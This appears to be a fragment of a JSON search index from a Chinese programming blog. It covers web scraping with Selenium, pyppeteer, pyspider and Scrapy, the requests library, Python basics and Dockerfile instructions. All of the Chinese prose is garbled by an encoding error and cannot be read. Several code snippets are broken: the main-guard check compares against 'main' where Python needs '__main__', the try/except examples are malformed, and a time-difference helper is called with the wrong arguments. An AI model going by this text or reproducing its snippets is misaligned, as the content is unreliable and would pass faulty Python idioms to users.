å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ï¼šæ•ˆç‡é«˜ï¼\n\n\n\nå—¯ï¼Œæ‰€ä»¥å‘¢ï¼Ÿå®‰è£…ä¸€ä¸‹ Python çš„ Selenium åº“ï¼Œå†å®‰è£…å¥½ PhantomJSï¼Œä¸å°±å¯ä»¥å®ç° Pythonï¼‹Seleniumï¼‹PhantomJS çš„æ— ç¼å¯¹æ¥äº†å˜›ï¼Selenium ç”¨æ¥é©±åŠ¨æµè§ˆå™¨, PhantomJS ç”¨æ¥æ¸²æŸ“è§£æç•Œé¢, Python è¿›è¡ŒåæœŸçš„å¤„ç†ï¼Œå®Œç¾çš„ä¸‰å‰‘å®¢ï¼\n\n\n\n```\npip install selenium\n```\n\n\n\nç„¶åæˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­, é€šè¿‡ selenium é©±åŠ¨ [chrome driver](https://sites.google.com/a/chromium.org/chromedriver/downloads)æ‰“å¼€ç™¾åº¦æœç´¢å…³é”®è¯\n\n```python\nfrom selenium import webdriver\nfrom selenium.webdriver.common.keys import Keys\n\nbrowser = webdriver.Chrome(executable_path=\"./drivers/chromedriver\")\nbrowser.get('http://www.baidu.com/')\n\nkw = browser.find_element_by_id(\"kw\")\nkw.send_keys(\"Selenium\", Keys.RETURN)\n```\n\n\n\n### 3.3. pyppeteer \n\npyppeteer æ˜¯ä¾èµ–äº chromium è¿™ä¸ªæµè§ˆå™¨æ¥è¿è¡Œçš„,  å¹¶ä¸”æ˜¯åŸºäº python çš„æ–°ç‰¹æ€§ async å®ç°çš„ï¼Œæ‰€ä»¥å®ƒçš„ä¸€äº›æ‰§è¡Œä¹Ÿæ”¯æŒå¼‚æ­¥æ“ä½œï¼Œæ•ˆç‡ç›¸å¯¹äº selenium æ¥è¯´ä¹Ÿæé«˜äº†ã€‚\n\n```bash\npip3 install pyppeteer\n```\n\næˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­, æ˜¯æ‰“å¼€baidu åæˆªå›¾\n\n```python\nimport asyncio\nfrom pyppeteer import launch\n\nasync def main():\n    browser = await launch()\n    page = await browser.newPage()\n    await page.goto('http://www.baidu.com')\n    await page.screenshot({'path': 'example.png'})\n    await browser.close()\n\nasyncio.get_event_loop().run_until_complete(main())\n```\n\n\n\n# 4. çˆ¬è™«æ¡†æ¶\n\n### 4.1 pyspider\n\npyspiderä¸Šæ‰‹æ›´ç®€å•ï¼Œæ“ä½œæ›´åŠ ç®€ä¾¿ï¼Œå› ä¸ºå®ƒå¢åŠ äº† WEB ç•Œé¢ï¼Œå†™çˆ¬è™«è¿…é€Ÿï¼Œé›†æˆäº†phantomjsï¼Œå¯ä»¥ç”¨æ¥æŠ“å–jsæ¸²æŸ“çš„é¡µé¢ã€‚\n\n```bash\npip install pyspider\n```\n\nå®‰è£…æˆåŠŸååœ¨ [python 3.7 ä¸‹è¿è¡Œå°±æŠ¥é”™](https://github.com/binux/pyspider/issues/817), çœ‹æ¥ä½œè€…å¾ˆä¹…æ²¡ç»´æŠ¤äº†\n\n\n\n\n### 4.2 scrapy\n\n```bash\npip install Scrapy\n```\n\nscrapyè‡ªå®šä¹‰ç¨‹åº¦é«˜ï¼Œæ¯” PySpideræ›´åº•å±‚ä¸€äº›ï¼Œé€‚åˆå­¦ä¹ ç ”ç©¶ï¼Œéœ€è¦å­¦ä¹ çš„ç›¸å…³çŸ¥è¯†å¤šï¼Œä¸è¿‡è‡ªå·±æ‹¿æ¥ç ”ç©¶åˆ†å¸ƒå¼å’Œå¤šçº¿ç¨‹ç­‰ç­‰æ˜¯éå¸¸åˆé€‚çš„ã€‚\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://cuiqingcai.com/1052.html\n+ https://cuiqingcai.com/6942.html\n+ https://github.com/Kr1s77/Python-crawler-tutorial-starts-from-zero","tags":["çˆ¬è™«"],"categories":["çˆ¬è™«"]},{"title":"python_requestsçš„ä½¿ç”¨","url":"%2Fp%2F4a761254.html","content":"\n\n\nrequestæ˜¯ä¸€ä¸ªç®€ç­”ä¼˜é›…çš„python HTTPåº“ï¼Œç›¸è¾ƒäºpythonæ ‡å‡†åº“ä¸­çš„urllibå’Œurllib2çš„åº“ï¼Œrequestsæ›´åŠ çš„ä¾¿äºç†è§£å’Œä½¿ç”¨.\n\n\n\n### 1. å®‰è£… requests\n\n```bash\npip install requests\n```\n\n<!-- more -->\n\n### 2. requestsåŒ…çš„ä½¿ç”¨\n\n##### get\n\n```\n>>> payload = {'key1': 'value1', 'key2': 'value2'}\n>>> r = requests.get('https://httpbin.org/get', params=payload)\n\n>>> print(r.url)\nhttps://httpbin.org/get?key2=value2&key1=value1\n```\n\n\n\n##### post\n\n```python\nimport requests\nimport json\n\nheaders = {'content-type': 'application/json'}\nurl = 'http://192.168.3.45:8080/api/v2/event/log'\n\ndata = {\"eventType\": \"AAS_PORTAL_START\", \"data\": {\"uid\": \"hfe3hf45huf33545\", \"aid\": \"1\", \"vid\": \"1\"}}\nparams = {'sessionKey': '9ebbd0b25760557393a43064a92bae539d962103', 'format': 'xml', 'platformId': 1}\n\nrequests.post(url, params=params, data=json.dumps(data), headers=headers, timeout=2)\n```\n\n\n\n##### parse \n\n```python\nimport requests\nrequests.get(url).json()\n```\n\n\n\n\n\n### 3. å‚è€ƒèµ„æ–™:\n\n+ https://2.python-requests.org//zh_CN/latest/user/quickstart.html","tags":["requests"],"categories":["python"]},{"title":"pythonåŸºç¡€å®è·µ","url":"%2Fp%2Fd319c20d.html","content":"\n### 1. æ¨¡å—\n\nPython æ¨¡å—(Module)ï¼Œæ˜¯ä¸€ä¸ª Python æ–‡ä»¶ï¼Œä»¥ .py ç»“å°¾ï¼ŒåŒ…å«äº† Python å¯¹è±¡å®šä¹‰å’ŒPythonè¯­å¥ã€‚\n\n```python\nfrom pkg.func import hello\n# pkg æ˜¯æ¨¡å—åå­—,å°±æ˜¯ç›®å½•åå­—\n# pkg.func æ˜¯ pkg ç›®å½•ä¸‹çš„ func æ–‡ä»¶\n# hello æ˜¯ func æ–‡ä»¶çš„ helloå‡½æ•°\n\n\nfrom pkg.topic import Topic\n# Topic æ˜¯ topic æ–‡ä»¶çš„ ç±»\n```\n\n\n\n+ `__init__.py` ,å¦‚æœç›®å½•ä¸­å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œè¯¥ç›®å½•å°±ä¼šè¢«è¯†åˆ«ä¸º module package ã€‚\n+ `__init__.py` åœ¨åŒ…è¢«å¯¼å…¥æ—¶ä¼šè¢«æ‰§è¡Œã€‚è¯¥æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„pythonä»£ç æ–‡ä»¶ï¼Œå› æ­¤å¯ä»¥å°†åˆå§‹åŒ–ä»£ç æ”¾å…¥è¯¥æ–‡ä»¶ä¸­ã€‚\n\n<!-- more -->\n\n### 2. pythonå‘½åè§„èŒƒ\n\n##### 2.1 æ¨¡å—\n\n- æ¨¡å—å°½é‡ä½¿ç”¨å°å†™å‘½åï¼Œé¦–å­—æ¯ä¿æŒå°å†™ï¼Œå°½é‡ä¸è¦ç”¨ä¸‹åˆ’çº¿(é™¤éå¤šä¸ªå•è¯ï¼Œä¸”æ•°é‡ä¸å¤šçš„æƒ…å†µ)\n\n```python\n# æ­£ç¡®çš„æ¨¡å—å\nimport decoder\nimport html_parser\n\n# ä¸æ¨èçš„æ¨¡å—å\nimport Decoder\n```\n\n##### 2.2 ç±»å\n\n- ç±»åä½¿ç”¨é©¼å³°(CamelCase)å‘½åé£æ ¼ï¼Œé¦–å­—æ¯å¤§å†™ï¼Œç§æœ‰ç±»å¯ç”¨ä¸€ä¸ªä¸‹åˆ’çº¿å¼€å¤´\n\n```Python\nclass Farm():\n    pass\n\nclass AnimalFarm(Farm):\n    pass\n\nclass _PrivateFarm(Farm):\n    pass\n```\n\n- å°†ç›¸å…³çš„ç±»å’Œé¡¶çº§å‡½æ•°æ”¾åœ¨åŒä¸€ä¸ªæ¨¡å—é‡Œ. ä¸åƒJava, æ²¡å¿…è¦é™åˆ¶ä¸€ä¸ªç±»ä¸€ä¸ªæ¨¡å—.\n\n##### 2.3 å‡½æ•°\n\n- å‡½æ•°åä¸€å¾‹å°å†™ï¼Œå¦‚æœ‰å¤šä¸ªå•è¯ï¼Œç”¨ä¸‹åˆ’çº¿éš”å¼€\n\n```python\ndef run():\n    pass\n\ndef run_with_env():\n    pass\n```\n\n- ç§æœ‰å‡½æ•°åœ¨å‡½æ•°å‰åŠ ä¸€ä¸ªä¸‹åˆ’çº¿_\n\n```python\nclass Person():\n    def _private_func():\n        pass\n```\n\n##### 2.4 å˜é‡å\n\n- å˜é‡åå°½é‡å°å†™, å¦‚æœ‰å¤šä¸ªå•è¯ï¼Œç”¨ä¸‹åˆ’çº¿éš”å¼€\n\n```python\nif __name__ == '__main__':\n    count = 0\n    school_name = ''\n```\n\n##### 2.5 å¸¸é‡\n\n- å¸¸é‡ä½¿ç”¨ä»¥ä¸‹åˆ’çº¿åˆ†éš”çš„å¤§å†™å‘½å\n\n```python\nMAX_CLIENT = 100\nMAX_CONNECTION = 1000\nCONNECTION_TIMEOUT = 600\n```\n\n\n\n### 3. python æ–¹æ³•è¿”å›å¤šä¸ªå€¼\n\n```python\ndef f():\n    return True, False\n  \n  \nx, y = f()\nprint(x)\nprint(y)\n\ngives:\nTrue\nFalse\n```\n\n\n\n### 4. sprintf()æ ¼å¼åŒ–è¾“å‡º\n\n```python\n# å­—ç¬¦ä¸²\n'%s %s' % ('one', 'two')\n'{} {}'.format('one', 'two')\none two\n\n\n# int\n'%d %d' % (1, 2)\n'{} {}'.format(1, 2)\n1 2\n\n\n# float\n'%f' % (3.141592653589793,)\n'{:f}'.format(3.141592653589793)\n3.141593\n\n\n# é¡ºåº\n'{1} {0}'.format('one', 'two')\ntwo one\n```\n\n\n\n### 5.  forå¾ªç¯\n\n```python\n# for in å¾ªç¯\nfruits = [\"apple\", \"banana\", \"cherry\"]\nfor x in fruits:\n  print(x)\n  \n  \n# rangeå¾ªç¯\nfor x in range(2, 6):\n  print(x)#2 3 4 5\nfor x in range(2, 10, 3):\n  print(x)# 2 5 8\n  \n  \n\n# å¾ªç¯å¸¦ k, v\npresidents = [\"Washington\", \"Adams\", \"Jefferson\", \"Madison\", \"Monroe\", \"Adams\", \"Jackson\"]\nfor num, name in enumerate(presidents, start=1):\n    print(\"President {}: {}\".format(num, name))\n    \n  \n# å¾ªç¯å¤šä¸ª\ncolors = [\"red\", \"green\", \"blue\", \"purple\"]\nratios = [0.2, 0.3, 0.1, 0.4]\nfor color, ratio in zip(colors, ratios):\n    print(\"{}% {}\".format(ratio * 100, color))\n    \n    \n# æ­»å¾ªç¯\nwhile True:\n  pass\n```\n\n\n\n### 6. `if __name__ == 'main'`\n\nä¸€ä¸ªpythonçš„æ–‡ä»¶æœ‰ä¸¤ç§ä½¿ç”¨çš„æ–¹æ³•ï¼Œç¬¬ä¸€æ˜¯ç›´æ¥ä½œä¸ºè„šæœ¬æ‰§è¡Œï¼Œç¬¬äºŒæ˜¯importåˆ°å…¶ä»–çš„pythonè„šæœ¬ä¸­è¢«è°ƒç”¨ï¼ˆæ¨¡å—é‡ç”¨ï¼‰æ‰§è¡Œã€‚\n\n\n\n`if __name__ == 'main'`: çš„ä½œç”¨å°±æ˜¯æ§åˆ¶è¿™ä¸¤ç§æƒ…å†µæ‰§è¡Œä»£ç çš„è¿‡ç¨‹ï¼Œåœ¨`if __name__ == 'main'`: ä¸‹çš„ä»£ç åªæœ‰åœ¨ç¬¬ä¸€ç§æƒ…å†µä¸‹ï¼ˆå³æ–‡ä»¶ä½œä¸ºè„šæœ¬ç›´æ¥æ‰§è¡Œï¼‰æ‰ä¼šè¢«æ‰§è¡Œï¼Œè€Œimportåˆ°å…¶ä»–è„šæœ¬ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ã€‚\n\n\n\n\n\n### 7. `__pycache__`\n\nåœ¨pythonä¸­è¿è¡Œç¨‹åºæ—¶ï¼Œè§£é‡Šå™¨é¦–å…ˆå°†å…¶ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨`__pycache__`æ–‡ä»¶å¤¹ã€‚å¦‚æœæ‚¨åœ¨é‚£é‡ŒæŸ¥æ‰¾ï¼Œæ‚¨å°†å‘ç°ä¸€å †æ–‡ä»¶å…±äº«çš„åç§°ã€‚åœ¨é¡¹ç›®æ–‡ä»¶å¤¹ä¸­çš„Pyæ–‡ä»¶ï¼Œåªæœ‰å®ƒä»¬çš„æ‰©å±•åæ‰æ˜¯å…¶ä¸­ä¹‹ä¸€.PYCæˆ–.pyo.ã€‚è¿™äº›åˆ†åˆ«æ˜¯å­—èŠ‚ç ç¼–è¯‘å’Œä¼˜åŒ–å­—èŠ‚ç ç¼–è¯‘ç‰ˆæœ¬çš„ç¨‹åºçš„æ–‡ä»¶ã€‚\n\n\nä¸‹æ¬¡å†æ‰§è¡Œå·¥ç¨‹æ—¶ï¼Œè‹¥è§£é‡Šå™¨å‘ç°è¿™ä¸ª *.py è„šæœ¬æ²¡æœ‰ä¿®æ”¹è¿‡ï¼Œå°±ä¼šè·³è¿‡ç¼–è¯‘è¿™ä¸€æ­¥ï¼Œç›´æ¥è¿è¡Œä»¥å‰ç”Ÿæˆçš„ä¿å­˜åœ¨ __pycache__æ–‡ä»¶å¤¹é‡Œçš„ *.pyc æ–‡ä»¶ã€‚\n\nè¿™æ ·å·¥ç¨‹è¾ƒå¤§æ—¶å°±å¯ä»¥å¤§å¤§ç¼©çŸ­é¡¹ç›®è¿è¡Œå‰çš„å‡†å¤‡æ—¶é—´ï¼›å¦‚æœä½ åªéœ€æ‰§è¡Œä¸€ä¸ªå°å·¥ç¨‹ï¼Œæ²¡å…³ç³» å¿½ç•¥è¿™ä¸ªæ–‡ä»¶å¤¹å°±è¡Œã€‚\n\n\n\n### 8. æ‰“å¼€æ–‡ä»¶è®¾ç½®ç¼–ç è¯»å–\n\n```python\nwith open(\"1.html\", \"r\", encoding='gbk') as f:\n  contents = f.read()\n  parse_html(contents)\n```\n\n\n\n### 9. è¯»å†™ json æ–‡ä»¶\n\n```python\nclass File(object):\n    def __init__(self):\n        self.name = \"zk8.json\"\n        if not os.path.exists(self.name): # æ²¡æœ‰å°±å†™ä¸€ä¸‹\n            with open(self.name, 'w'): pass\n\n\n    def save(self, data):\n        with open(self.name, 'w', encoding='utf-8') as f:\n            json.dump(data, f, ensure_ascii=False, indent=4)\n\n\n    def load(self):\n        with open(self.name, 'r', encoding='utf-8') as f:\n            data = json.load(f)\n            return data\n\n```\n\n\n\n### 10. æ•°æ®ç»“æ„ æ“ä½œ\n\n```python\n############ list ############\n>>> fruits = ['orange', 'apple', 'pear', 'banana', 'kiwi', 'apple', 'banana']\n>>> fruits.count('apple')\n2\n>>> fruits.count('tangerine')\n0\n>>> fruits.index('banana')\n3\n>>> fruits.index('banana', 4)  # Find next banana starting a position 4\n6\n>>> fruits.reverse()\n>>> fruits\n['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange']\n>>> fruits.append('grape')\n>>> fruits\n['banana', 'apple', 'kiwi', 'banana', 'pear', 'apple', 'orange', 'grape']\n>>> fruits.sort()\n>>> fruits\n['apple', 'apple', 'banana', 'banana', 'grape', 'kiwi', 'orange', 'pear']\n>>> fruits.pop()\n'pear'\n\n\n############ tuple ############\n\n>>> t = 12345, 54321, 'hello!'\n>>> t[0]\n12345\n>>> t\n(12345, 54321, 'hello!')\n>>> # Tuples may be nested:\n... u = t, (1, 2, 3, 4, 5)\n>>> u\n((12345, 54321, 'hello!'), (1, 2, 3, 4, 5))\n>>> # Tuples are immutable:\n... t[0] = 88888\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: 'tuple' object does not support item assignment\n>>> # but they can contain mutable objects:\n... v = ([1, 2, 3], [3, 2, 1])\n>>> v\n([1, 2, 3], [3, 2, 1])\n\n############ set ############\n\n>>> basket = {'apple', 'orange', 'apple', 'pear', 'orange', 'banana'}\n>>> print(basket)                      # show that duplicates have been removed\n{'orange', 'banana', 'pear', 'apple'}\n>>> 'orange' in basket                 # fast membership testing\nTrue\n>>> 'crabgrass' in basket\nFalse\n\n>>> # Demonstrate set operations on unique letters from two words\n...\n>>> a = set('abracadabra')\n>>> b = set('alacazam')\n>>> a                                  # unique letters in a\n{'a', 'r', 'b', 'c', 'd'}\n>>> a - b                              # letters in a but not in b\n{'r', 'd', 'b'}\n>>> a | b                              # letters in a or b or both\n{'a', 'c', 'r', 'd', 'b', 'm', 'z', 'l'}\n>>> a & b                              # letters in both a and b\n{'a', 'c'}\n>>> a ^ b                              # letters in a or b but not both\n{'r', 'd', 'b', 'm', 'z', 'l'}\n\n\n\n\n############ dict ############\n>>> tel = {'jack': 4098, 'sape': 4139}\n>>> tel['guido'] = 4127\n>>> tel\n{'jack': 4098, 'sape': 4139, 'guido': 4127}\n>>> tel['jack']\n4098\n>>> del tel['sape']\n>>> tel['irv'] = 4127\n>>> tel\n{'jack': 4098, 'guido': 4127, 'irv': 4127}\n>>> list(tel)\n['jack', 'guido', 'irv']\n>>> sorted(tel)\n['guido', 'irv', 'jack']\n>>> 'guido' in tel\nTrue\n>>> 'jack' not in tel\nFalse\n\n# é¿å… å¾ªç¯ä¸­åˆ é™¤ key æŠ¥é”™\nfor i in list(d):\n  del d[i]\n```\n\n\n\n\n\n### 11. ç±»çš„ç‰¹æ®Šå‡½æ•°\n\n```python\n# __init__ æ„é€ \nclass Foo:\n    def __init__(self, a, b, c):\nx = Foo(1, 2, 3) \n\n## __del__ ææ„\nclass FileObject:\n    def __del__(self):\n        self.file.close()\n        del self.file\n\n\n# __call__ ç±»å˜æˆå¯è°ƒç”¨\nclass Foo:\n    def __call__(self, a, b, c):\nx = Foo()\nx(1, 2, 3) \n\n\n#__getattr__ ä¸å­˜åœ¨çš„å±æ€§\nclass Dummy(object):\n    def __getattr__(self, attr):\n        return attr.upper()\nd = Dummy()\nd.does_not_exist # 'DOES_NOT_EXIST'\n```\n\n\n\n### 12. æšä¸¾\n\n```python\nfrom enum import Enum \nclass Animal(Enum):\n    ant = 1\n    bee = 2\n    cat = 3\n    dog = 4\n```\n\n\n\n### 13. æ–°çš„çº¿ç¨‹å®šæ—¶æ‰§è¡Œå‡½æ•°\n\n```python\ntimer = threading.Timer(10, func)\ntimer.start()\n```\n\n\n\n### 14. PYTHONPATH \n\nä¸»è¦è§£å†³ ModuleNotFoundError: No module named 'pkg'\n\n```bash\necho $PYTHONPATH\nexport PYTHONPATH=\"/Users/liuwei/workspace/python/zk8\"\n```\n\n\n\n### 15. time\n\n```python\n# time format\nfrom datetime import datetime\ndatetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")\n\n# time diff\ndef get_time_diff(date):\n    FMT = '%Y-%m-%d %H:%M'\n    now = datetime.datetime.strptime(time.strftime(FMT), FMT)\n    start = datetime.datetime.strptime(date, FMT)\n    return (now - start).seconds\n  \n  \n# seconds to human  \nstr(datetime.timedelta(seconds=get_time_diff(10000)))\n```\n\n\n\n### 16. try catch\n\n```python\n# except and raise\ntry:\n    f = open('myfile.txt')\n    s = f.readline()\n    i = int(s.strip())\nexcept OSError as err:\n    print(\"OS error: {0}\".format(err))\nexcept ValueError:\n    print(\"Could not convert data to an integer.\")\nexcept:\n    print(\"Unexpected error:\", sys.exc_info()[0])\n    raise\n    \n\n # æ‹¿åˆ° error ä¿¡æ¯\ntry:\n  except Exception as e:\n  else:\n    \n try:\n  except Exception as e:\n  finally:\n```\n\n\n\n### 17. string\n\n```python\nstring = 'GeeksforGeeks'\nprint(string.lower()) \nprint(string.upper()) \n\n\n# contain\n>>> str = \"Messi is the best soccer player\"\n>>> \"soccer\" in str\nTrue\n```\n\n\n\n\n\n### 18. ç±»\n\n```python\n\"\"\"\nï¼ˆ1ï¼‰_xxx Â  Â  Â \"å•ä¸‹åˆ’çº¿ \" å¼€å§‹çš„æˆå‘˜å˜é‡å«åšä¿æŠ¤å˜é‡ï¼Œæ„æ€æ˜¯åªæœ‰ç±»å®ä¾‹å’Œå­ç±»å®ä¾‹èƒ½è®¿é—®åˆ°è¿™äº›å˜é‡ï¼Œ\néœ€é€šè¿‡ç±»æä¾›çš„æ¥å£è¿›è¡Œè®¿é—®ï¼›ä¸èƒ½ç”¨'from module import *'å¯¼å…¥\nï¼ˆ2ï¼‰__xxx Â  Â ç±»ä¸­çš„ç§æœ‰å˜é‡/æ–¹æ³•å ï¼ˆPythonçš„å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥æˆå‘˜æ–¹æ³•ç§°ä¸ºæˆå‘˜å˜é‡ä¹Ÿè¡Œå¾—é€šã€‚ï¼‰,\n\" åŒä¸‹åˆ’çº¿ \" å¼€å§‹çš„æ˜¯ç§æœ‰æˆå‘˜ï¼Œæ„æ€æ˜¯åªæœ‰ç±»å¯¹è±¡è‡ªå·±èƒ½è®¿é—®ï¼Œè¿å­ç±»å¯¹è±¡ä¹Ÿä¸èƒ½è®¿é—®åˆ°è¿™ä¸ªæ•°æ®ã€‚\nï¼ˆ3ï¼‰__xxx__ ç³»ç»Ÿå®šä¹‰åå­—ï¼Œå‰åå‡æœ‰ä¸€ä¸ªâ€œåŒä¸‹åˆ’çº¿â€ ä»£è¡¨pythoné‡Œç‰¹æ®Šæ–¹æ³•ä¸“ç”¨çš„æ ‡è¯†ï¼Œå¦‚ __init__ï¼ˆï¼‰ä»£è¡¨ç±»çš„æ„é€ å‡½æ•°ã€‚\n\"\"\"\n```\n\n\n\n\n\n### 19. æ‰“ä¹±list\n\n```\ncats = list(range(10, 17))\nrandom.shuffle(cats)\n```\n\n\n\n### *arg å’Œ**args\n\nhttp://www.wklken.me/posts/2013/12/21/how-to-use-args-and-kwargs-in-python.html","tags":["python"],"categories":["python"]},{"title":"è®°å½•ä¸€æ¬¡dockeré•œåƒçš„æ„å»ºè¿‡ç¨‹","url":"%2Fp%2F2450240c.html","content":"\nåœ¨åˆ¶ä½œ Docker Images ä¹‹å‰, æˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹Docker å®˜æ–¹æä¾›äº†ä¸€äº›å»ºè®®å’Œå‡†åˆ™ï¼Œåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹å»ºè®®éµå®ˆã€‚\n\n+ å®¹å™¨æ˜¯çŸ­æš‚çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä½ éœ€è¦å¯ä»¥å®¹æ˜“çš„åˆ›å»ºã€é”€æ¯ã€é…ç½®ä½ çš„å®¹å™¨ã€‚\n\n+ å¤šæ•°æƒ…å†µï¼Œæ„å»ºé•œåƒçš„æ—¶å€™æ˜¯å°† Dockerfile å’Œæ‰€éœ€æ–‡ä»¶æ”¾åœ¨åŒä¸€æ–‡ä»¶å¤¹ä¸‹ã€‚ä½†ä¸ºäº†æ„å»ºæ€§èƒ½ï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨ [.dockerignore](https://deepzz.com/post/dockerfile-reference.html#toc_6) æ–‡ä»¶æ¥æ’é™¤æ–‡ä»¶å’Œç›®å½•ã€‚\n\n+ é¿å…å®‰è£…ä¸å¿…è¦çš„åŒ…ï¼Œæ„å»ºé•œåƒåº”è¯¥å°½å¯èƒ½å‡å°‘å¤æ‚æ€§ã€ä¾èµ–å…³ç³»ã€æ„å»ºæ—¶é—´åŠé•œåƒå¤§å°ã€‚\n\n+ æœ€å°åŒ–å±‚æ•°ã€‚ Dockerfileçš„ä¸€è¡Œ(é™¤MAINTAINERå¤–)å¯¹åº”é•œåƒçš„ä¸€å±‚ï¼Œä¸ºä½¿å±‚æ•°è¶³å¤Ÿå°ï¼Œæ•…å¯ä»¥å°†ç±»ä¼¼çš„å‘½ä»¤ä¸²èµ·æ¥ï¼Œæ¯”å¦‚RUN æŒ‡ä»¤ï¼Œå¯ä»¥ä½¿ç”¨&&è¿æ¥å¤šä¸ªæŒ‡ä»¤ï¼Œå¦‚æ­¤ä¹Ÿåªæœ‰ä¸€å±‚ã€‚\n\n+ æ’åºå¤šè¡Œå‚æ•°ï¼Œé€šè¿‡å­—æ¯å°†å‚æ•°æ’åºæ¥ç¼“è§£ä»¥åçš„å˜åŒ–ï¼Œè¿™å°†å¸®ä½ é¿å…é‡å¤çš„åŒ…ã€ä½¿åˆ—è¡¨æ›´å®¹æ˜“æ›´æ–°ï¼Œå¦‚ï¼š\n\n```dockerfile\nRUN apt-get update && apt-get install -y \\\n  bzr \\\n  cvs \\\n  git \\\n  mercurial \\\n  subversion\n```\n\n<!-- more -->\n\n\n\n### 0. å‰è¨€\n\nå®¹å™¨å†…æ²¡æœ‰åå°æœåŠ¡çš„æ¦‚å¿µã€‚å®¹å™¨å°±æ˜¯ä¸ºäº†ä¸»è¿›ç¨‹è€Œå­˜åœ¨çš„ï¼Œä¸»è¿›ç¨‹é€€å‡ºï¼Œå®¹å™¨å°±å¤±å»äº†å­˜åœ¨çš„æ„ä¹‰ï¼Œä»è€Œé€€å‡ºï¼Œå…¶å®ƒè¾…åŠ©è¿›ç¨‹ä¸æ˜¯å®ƒéœ€è¦å…³å¿ƒçš„ä¸œè¥¿ã€‚æ‰€ä»¥CMD è¿è¡Œå¯æ‰§è¡Œç¨‹åº, é˜»å¡æ‰å¯ä»¥, è¦ä¸ç„¶ä¼šé€€å‡ºã€‚\n\n\n\n###  1. FROM ä»“åº“\n\nå°½å¯èƒ½çš„ä½¿ç”¨å®˜æ–¹ä»“åº“å­˜å‚¨çš„é•œåƒä½œä¸ºåŸºç¡€é•œåƒã€‚å®˜æ–¹å»ºè®®ä½¿ç”¨ [Debian](https://hub.docker.com/_/debian/)ï¼Œå¤§å°åœ¨ 150mb å·¦å³ã€‚ä¸è¿‡åœ¨å®é™…å¼€å‘ä¸­ï¼Œåº”è¯¥ç”¨åˆ° [alpine](https://hub.docker.com/_/alpine/) çš„æ¬¡æ•°æ¯”è¾ƒå¤šï¼Œå› ä¸ºå®ƒä»… 5mb å·¦å³ã€‚ busyboxæ›´åªæœ‰1Må¤šã€‚\n\nå‚è€ƒ: https://blog.csdn.net/bbwangj/article/details/81088231\n\n\n\n### 2. æŒ‡ä»¤\n\n##### 2.1 COPY å’Œ ADD çš„åŒºåˆ«\n\nåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ä½¿ç”¨COPY, ä½¿ç”¨ADDçš„å”¯ä¸€åŸå› å°±æ˜¯ä½ æœ‰ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œä½ æƒ³è‡ªåŠ¨è§£å‹åˆ°é•œåƒä¸­ã€‚\n\n##### 2.2 RUN å’Œ CMD çš„åŒºåˆ«\n\n+ RUNå‘½ä»¤æ˜¯åˆ›å»ºDockeré•œåƒçš„æ­¥éª¤ï¼Œä¸€ä¸ªDockerfileä¸­å¯ä»¥æœ‰è®¸å¤šä¸ªRUNå‘½ä»¤ã€‚\n+ CMDå‘½ä»¤æ˜¯å½“Dockeré•œåƒè¢«å¯åŠ¨åDockerå®¹å™¨å°†ä¼šé»˜è®¤æ‰§è¡Œçš„å‘½ä»¤ã€‚ä¸€ä¸ªDockerfileä¸­åªèƒ½æœ‰ä¸€ä¸ªCMDå‘½ä»¤ã€‚é€šè¿‡æ‰§è¡Œdocker run $image other_commandå¯åŠ¨é•œåƒå¯ä»¥é‡è½½CMDå‘½ä»¤ã€‚\n\n##### 2.3 ENTRYPOINT å’Œ CMDçš„åŒºåˆ«\n\nThe main purpose of a CMD is to provide defaults for an executing container. These defaults can include an executable, or they can omit the executable, in which case you must specify an ENTRYPOINT instruction as well.\n\nå¦‚æœdocker runæ²¡æœ‰æŒ‡å®šä»»ä½•çš„æ‰§è¡Œå‘½ä»¤æˆ–è€…dockerfileé‡Œé¢ä¹Ÿæ²¡æœ‰entrypointï¼Œé‚£ä¹ˆï¼Œå°±ä¼šä½¿ç”¨cmdæŒ‡å®šçš„é»˜è®¤çš„æ‰§è¡Œå‘½ä»¤æ‰§è¡Œã€‚åŒæ—¶ä¹Ÿä»ä¾§é¢è¯´æ˜äº†entrypointçš„å«ä¹‰ï¼Œå®ƒæ‰æ˜¯çœŸæ­£çš„å®¹å™¨å¯åŠ¨ä»¥åè¦æ‰§è¡Œå‘½ä»¤ã€‚\n\n+ CMDçš„ç”¨æ³•\n\n  ```\n  The CMD instruction has three forms:\n   \n  CMD [\"executable\",\"param1\",\"param2\"] (exec form, this is the preferred form) //æ¨è\n  CMD [\"param1\",\"param2\"] (as default parameters to ENTRYPOINT)\n  CMD command param1 param2 (shell form)\n  \n  \n  \n  \n  \n  \n  eg1: CMD [\"/bin/bash\", \"-c\", \"echo 'hello cmd!'\"]\n  eg2: CMD [\"hello cmd!\"]\n\t\t ENTRYPOINT [\"echo\"]\n  eg3: CMD echo \"hello cmd!\"\n  ```\n  \n  \n  \n+ entrypointçš„ç”¨æ³•\n\n  An ENTRYPOINT allows you to configure a container that will run as an executable.\n\n  ```\n  ENTRYPOINT has two forms:\n  \n  ENTRYPOINT [\"executable\", \"param1\", \"param2\"] (exec form, preferred) //æ¨è\n  ENTRYPOINT command param1 param2 (shell form)\n  \n  \n  \n  \n  \n  eg1: 